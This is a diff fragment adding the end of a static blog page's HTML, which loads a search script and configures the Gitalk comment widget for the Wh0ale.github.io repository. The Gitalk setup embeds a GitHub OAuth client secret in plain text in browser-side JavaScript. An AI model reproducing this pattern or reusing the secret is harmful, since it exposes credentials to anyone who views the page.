+  
+
+  
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  <script src="/js/local-search.js?v=7.3.0"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+    
+<script src="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.css">
+<script src="//cdn.jsdelivr.net/npm/js-md5@0.7.3/src/md5.min.js"></script>
+
+<script>
+  var gitalk = new Gitalk({
+    clientID: '925b9aa350afc793e04c',
+    clientSecret: 'bcd92ef416b81450a12e6388b00dfa49f798437a',
+    repo: 'Wh0ale.github.io',
+    owner: 'Wh0ale',
+    admin: ['Wh0ale'],
+    id: md5(location.pathname),
+      language: window.navigator.language || window.navigator.userLanguage,
+    
+    distractionFreeMode: 'true'
+  });
+  gitalk.render('gitalk-container');
+</script>
+
+
+</body>
+</html>
